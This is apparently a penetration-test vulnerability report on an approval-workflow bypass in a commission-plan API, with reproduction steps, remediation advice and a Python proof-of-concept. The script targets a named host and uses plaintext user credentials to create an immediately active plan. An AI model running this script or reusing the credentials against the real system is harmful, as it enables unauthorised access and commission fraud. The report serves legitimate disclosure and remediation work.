# Business Logic Flaw: Commission Plan Workflow Bypass Enables Unauthorized Plan Creation and Activation

**ID:** vuln-0026
**Severity:** CRITICAL
**Found:** 2026-02-26 18:56:37 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission plan creation workflow that allows attackers to completely bypass the intended approval process and create immediately active commission plans.

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which accepts an `isActive` parameter that can be set to `true` during plan creation. The application fails to enforce the intended workflow where commission plans should be created in a "draft" state and require explicit approval before activation.

An attacker with Organization-level access can:
1. Create commission plans directly through the API endpoint
2. Set the `isActive` parameter to `true` during creation
3. Bypass all approval workflows
4. Create immediately active commission plans without oversight

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Financial Fraud**: Create unauthorized commission plans with manipulative structures that could result in excessive payouts
2. **Operational Disruption**: Bypass intended business controls and approval processes
3. **Regulatory Compliance Violations**: Create commission plans that violate organizational policies and regulatory requirements
4. **Unauthorized Data Modification**: Modify commission structures without proper authorization
5. **Business Process Bypass**: Completely circumvent the intended multi-step commission plan approval workflow

The financial impact could be severe, potentially resulting in significant monetary losses through manipulated commission calculations and unauthorized payouts. The operational impact includes loss of control over commission structures and potential regulatory compliance issues.

## Technical Analysis

The vulnerability exists due to insufficient workflow enforcement in the commission plan creation process:

1. **Missing Workflow Validation**: The application does not validate that commission plans should be created in a "draft" state
2. **Direct Activation Bypass**: The `isActive` parameter can be set to `true` during creation, bypassing approval workflows
3. **Insufficient State Management**: No proper state transition validation exists for commission plans
4. **API-Only Vulnerability**: The vulnerability is only exploitable through direct API calls, not through the UI

The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts JSON payloads with an `isActive` parameter that is directly processed without validation against the intended workflow. The application relies on the UI to enforce workflow steps, which can be easily bypassed through direct API access.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate as an Organization user (nlnarayana3858@gmail.com / User@1234)
2. Capture the authentication token from the `/api/authenticate` response
3. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with the following payload:
   ```json
   {
     "planName": "Unauthorized Active Plan",
     "planDescription": "Plan created bypassing approval workflow",
     "commissionPercentage": 10,
     "isActive": true,
     "clientId": null,
     "orgId": "current_org_id",
     "rules": []
   }
   ```
4. Observe that the commission plan is created and immediately active
5. Verify by calling `/api/commission-plan/get-all` that the plan shows as active
6. Confirm that no approval workflow was triggered

**Alternative Exploitation:**
1. Authenticate as an Organization user
2. Use a proxy to intercept the commission plan creation request
3. Modify the `isActive` parameter from `false` to `true`
4. Forward the modified request
5. Observe that the plan is created in active state

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"
COMMISSION_PLAN_LIST_ENDPOINT = f"{BASE_URL}/api/commission-plan/get-all"

# Organization user credentials
CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

# Step 1: Authenticate and get JWT token
auth_response = requests.post(AUTH_ENDPOINT, json=CREDENTIALS)
auth_data = auth_response.json()
jwt_token = auth_data['id_token']

headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

# Step 2: Create commission plan bypassing approval workflow
bypass_plan = {
    "planName": "Exploit - Workflow Bypass",
    "planDescription": "Commission plan created bypassing approval workflow",
    "commissionPercentage": 10,
    "isActive": True,  # This bypasses the approval workflow
    "clientId": None,
    "orgId": "current_org_id",  # Would be replaced with actual org ID
    "rules": []
}

# Step 3: Submit the commission plan
response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=bypass_plan)

if response.status_code == 200:
    print("SUCCESS: Commission plan created bypassing approval workflow")
    plan_data = response.json()
    print(f"Plan ID: {plan_data.get('id')}")
    print(f"Plan Name: {plan_data.get('planName')}")
    print(f"Plan Status: {'ACTIVE' if plan_data.get('isActive') else 'INACTIVE'}")

    # Step 4: Verify the plan is active
    list_response = requests.get(COMMISSION_PLAN_LIST_ENDPOINT, headers=headers)
    if list_response.status_code == 200:
        plans = list_response.json()
        for plan in plans:
            if plan.get('planName') == "Exploit - Workflow Bypass":
                print(f"\nVerification - Plan found in active plans:")
                print(f"Plan ID: {plan.get('id')}")
                print(f"Plan Status: {'ACTIVE' if plan.get('isActive') else 'INACTIVE'}")
                print("\nThis demonstrates complete bypass of the approval workflow")
    else:
        print(f"Failed to verify plan: {list_response.status_code} - {list_response.text}")
else:
    print(f"FAILED: {response.status_code} - {response.text}")
```

## Remediation

**Immediate Remediation Steps:**

1. **Enforce Workflow State Validation**:
   - Modify the `/api/CommissionPlan/CreateCommissionPlan` endpoint to ignore the `isActive` parameter during creation
   - Force all new commission plans to be created in a "draft" or "pending approval" state
   - Implement proper state transition validation

2. **Implement Approval Workflow**:
   - Create a separate `/api/CommissionPlan/ApprovePlan` endpoint for activating plans
   - Implement multi-level approval processes for commission plan activation
   - Add proper authorization checks for approval actions

3. **Add Server-Side Validation**:
   - Validate that commission plans can only be activated through the proper approval workflow
   - Implement state machine validation for commission plans
   - Add validation to prevent direct activation during creation

4. **Audit and Monitoring**:
   - Implement logging for all commission plan creation and modification events
   - Set up alerts for commission plans that bypass approval workflows
   - Regularly audit commission plans for unauthorized modifications

**Long-Term Recommendations:**

1. Implement a comprehensive commission management workflow with multiple approval steps
2. Add role-based access control for commission plan management
3. Implement change tracking for all commission plan modifications
4. Conduct regular security testing of commission-related functionality
5. Implement financial controls to detect and prevent commission manipulation
6. Add comprehensive logging and alerting for commission processing
7. Implement integration with identity management systems for proper authorization

